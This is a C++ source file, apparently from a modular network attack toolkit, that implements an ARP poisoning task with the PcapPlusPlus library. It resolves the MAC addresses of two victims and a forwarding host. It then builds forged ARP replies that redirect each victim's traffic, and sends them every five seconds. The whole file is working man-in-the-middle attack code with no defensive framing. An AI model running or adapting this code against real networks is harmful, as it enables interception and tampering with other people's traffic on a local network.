//
// Created by dev on 6/9/25.
//

#include "arp-poisoning-task.hpp"

void ashk::tasks::ArpPoisoningTask::exec() {
    logger.log("starting arp poisoning . . .\n");
    dev_ = pcpp::PcapLiveDeviceList::getInstance().getDeviceByIp(iface_ip);
    if (dev_ == nullptr) {
        logger.log("couldn't find device\n");
        return;
    }
    if (!dev_->open()){
        logger.log("couldn't open device");
        return;
    }

    pcpp::MacAddress iface_mac = dev_->getMacAddress();

    if (vic_src_ip == iface_ip) {
        vic_src_mac = iface_mac;
    } else {
        vic_src_mac = NetUtils::arp(vic_src_ip,dev_);
        if (vic_src_mac == pcpp::MacAddress::Zero) {
            logger.log("didnt receive arp reply from " + vic_src_ip.toString() + "\n");
            return;
        }
    }

    if (vic_dst_ip == iface_ip) {
        vic_dst_mac = iface_mac;
    } else {
        vic_dst_mac = NetUtils::arp(vic_dst_ip,dev_);
        if (vic_dst_mac == pcpp::MacAddress::Zero) {
            logger.log("didnt receive arp reply from " + vic_dst_ip.toString() + "\n");
            return;
        }
    }
    pcpp::MacAddress forward_to;
    if (forward_to_ip == iface_ip) {
        forward_to = iface_mac;
    } else {
        forward_to = NetUtils::arp(forward_to_ip,dev_);
        if (forward_to == pcpp::MacAddress::Zero) {
            logger.log("didnt receive arp reply from " + forward_to_ip.toString() + "\n");
            return;
        }
    }


    pcpp::Packet gwArpReply(500);
    pcpp::EthLayer gwEthLayer(iface_mac, vic_dst_mac, static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
    pcpp::ArpLayer gwArpLayer(pcpp::ArpReply(forward_to, vic_src_ip, vic_dst_mac, vic_dst_ip));

    gwArpReply.addLayer(&gwEthLayer);
    gwArpReply.addLayer(&gwArpLayer);
    gwArpReply.computeCalculateFields();

    // Create ARP reply for the victim
    pcpp::Packet victimArpReply(500);
    pcpp::EthLayer victimEthLayer(iface_mac, vic_src_mac, static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
    pcpp::ArpLayer victimArpLayer(pcpp::ArpReply(forward_to, vic_dst_ip, vic_src_mac, vic_src_ip));
    victimArpReply.addLayer(&victimEthLayer);
    victimArpReply.addLayer(&victimArpLayer);
    victimArpReply.computeCalculateFields();

    logger.log("Sending ARP replies to victim and to gateway every 5 seconds...\n");
    while (is_running()) {
        dev_->sendPacket(&gwArpReply);
        dev_->sendPacket(&victimArpReply);

        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
    logger.log("ArpPoisoning task finished\n");

}
std::string ashk::tasks::ArpPoisoningTask::get_data(tasks_data_id data_id) {
    if(!extractable_data.count(data_id))
        return "";
    switch (data_id) {
        case VICTIM_DST_MAC:
            return vic_dst_mac.toString();
        case VICTIM_SRC_MAC:
            return vic_src_mac.toString();
        default:
            return "";
    }
}

ashk::tasks::ArpPoisoningTask::ArpPoisoningTask(pcpp::PcapLiveDevice *dev,
                                                pcpp::IPv4Address vic_src_ip, pcpp::IPv4Address vic_dst_ip,
                                                pcpp::IPv4Address forward_to_ip, pcpp::IPv4Address iface_ip) :
                                                dev_(dev),vic_dst_ip(vic_dst_ip),vic_src_ip(vic_src_ip),
                                                iface_ip(iface_ip),forward_to_ip(forward_to_ip)
                                                {


                                                }
